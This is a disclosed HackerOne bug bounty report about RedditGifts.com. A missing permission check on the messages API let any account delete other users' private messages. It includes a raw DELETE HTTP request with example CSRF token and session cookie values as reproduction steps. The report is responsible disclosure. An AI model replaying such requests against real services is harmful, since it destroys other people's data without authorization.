# Deleting all DMs on RedditGifts.com

## Report Details
- **Report ID**: 1213237
- **URL**: https://hackerone.com/reports/1213237
- **State**: Closed
- **Severity**: high
- **Submitted**: 2021-05-31T02:09:36.165Z
- **Disclosed**: 2021-10-21T19:51:19.877Z

## Reporter
- **Username**: hakercic
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: reddit

## Vulnerability Information
## Summary:
It's possible to delete all 4.4M private messages on RedditGifts.com due to missing permission check on DELETE request

## Steps To Reproduce:

  1. Set up 3 accounts on RedditGifts.com (FriendA, FriendB, Attacker)
  1. Have FriendA send message to FriendB
  1. As Attacker send the following request (with cookies):
```
DELETE /api/v1/messages/4423007/ HTTP/1.1
Host: www.redditgifts.com
X-CSRFTOKEN: rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj
Referer: https://www.redditgifts.com/api/
Cookie: csrftoken=rYxQcijrs6viZxyLZt2os9gNvLgmEeXfSrH5wOe10GcOg3ABOvL3ebDbAXmeXojj; sessionid=osymp6sp6bb83gyt8of7qbeurtuo2450
```
Change cookies/csrf token and `4423007` to your own message ID

## Supporting Material/References:

{F1320816}
{F1320817}

## Impact

It's possible to delete all 4.4M private messages on RedditGifts.com

## Attachments
- recording-1622426911152.webm
- Screenshot_3.png
